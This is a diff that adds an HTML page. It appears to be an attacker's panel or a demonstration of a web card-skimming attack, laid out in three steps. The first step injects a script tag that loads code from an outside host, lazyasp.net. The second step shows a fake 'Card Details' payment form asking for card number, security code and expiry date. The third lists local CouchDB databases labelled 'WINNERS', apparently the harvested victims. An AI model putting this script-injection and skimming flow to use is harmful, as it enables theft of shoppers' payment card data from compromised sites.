@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta content="text/html; charset=UTF-8" http-equiv="content-type" />
+        <link href="base.css" rel="stylesheet" type="text/css" />
+    </head>
+    <body>
+        <ul>
+            <li class="injectscript">
+                <h1>Inject script</h1>
+                <div class="num">1</div>
+                <ul>
+                    <li>
+                        <label>Field 1:</label>
+                        <input readonly="readonly" value="&lt;script src=&quot;http://lazyasp.net/j.js&quot;&gt;&lt;/script&gt;" />
+                    </li>
+                    <li class="other">...</li>
+                    <li class="save">
+                        <button>
+                            <img alt="" src="http://resources.livetester.net/img/apply.png" style="vertical-align:middle" />
+                            <span style="vertical-align:middle">Save</span>
+                        </button>
+                    </li>
+                </ul>
+            </li>
+            <li class="getform">
+                <h1>Get injected form</h1>
+                <div class="num">2</div>
+                <div class="injectedform">
+			<table>
+				<tr class="title"><td colspan="2">Card Details</td></tr>
+				<tr><td>* Card number</td><td><input /></td></tr>
+				<tr><td>* Security code</td><td><input /></td></tr>
+				<tr><td>* Expiry Date</td><td><input /></td></tr>
+				<tr><td colspan="2"><button>MAKE PAYMENT</button></td></tr>
+				<tr><td colspan="2"><div class="poweredby">Powered By:<a href="x.htm#stolen">lazyasp.net</a></div></td></tr>
+			</table>
+                </div>
+            </li>
+            <li class="getwinners">
+                <h1>Get &quot;WINNERS&quot;</h1>
+                <div class="num">3</div>
+                <ul id="databases"></ul>
+            </li>
+        </ul>
+        <div class="clear"></div>
+        
+       <script src="http://localhost:5984/_utils/script/jquery.js"></script> 
+       <script src="http://localhost:5984/_utils/script/jquery.couch.js"></script>
+       <script>
+	$.couch.allDbs({
+		success : function(dbs) {
+			dbs.forEach(function(db) {
+			  $("#databases").append('<li><a href="http://localhost:5984/_utils/database.html?'+db+'">'+db+'</a></li>');
+			});
+		}
+	});
+       </script>
+    </body>
+</html>
